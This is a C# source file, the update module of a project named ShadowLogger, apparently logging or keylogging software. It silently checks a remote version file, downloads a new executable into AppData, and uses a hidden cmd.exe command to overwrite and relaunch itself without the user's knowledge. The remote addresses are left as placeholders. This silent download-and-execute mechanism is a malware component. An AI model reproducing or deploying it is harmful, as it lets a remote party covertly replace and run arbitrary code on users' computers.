using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.UpdateApp
{
    internal static class Updater
    {
        internal static void CheckForUpdates()
        {
            Version currentversion = new Version(Application.ProductVersion);
            Version newestversion;

            try {
                newestversion = new Version(SharedMethods.CreateWebRequest("File with the newest version of the app to check at every startup for updates.txt"));
            }
            catch (Exception ex) {
                SharedMethods.LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
                return;
            }

            if (currentversion.CompareTo(newestversion) < 0)
            {
                UpdateApp();
            }
        }

        internal static void UpdateApp()
        {
            string fileToUpdateLink = SharedMethods.CreateWebRequest("File with the direct link of the updated app.txt");

            if (fileToUpdateLink == string.Empty) return;

            string fileToUpdatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Path.GetFileName(Application.ExecutablePath));

            WebClient wc = new WebClient();
            try
            {
                wc.DownloadFile(fileToUpdateLink, fileToUpdatePath);
            }
            catch (Exception ex)
            {
                SharedMethods.LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
                return;
            }
            finally
            {
                wc.Dispose();
            }

            RunUpdatedFile(fileToUpdatePath);
        }

        private static void RunUpdatedFile(string filepath)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = string.Format(@"/c ping 1.1.1.1 -n 1 -w 5000 > NUL & move /y ""{0}"" ""{1}"" & start """" ""{1}""", filepath, Application.ExecutablePath),
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process.Start(procStartInfo);
            Application.Exit();
        }
    }
}
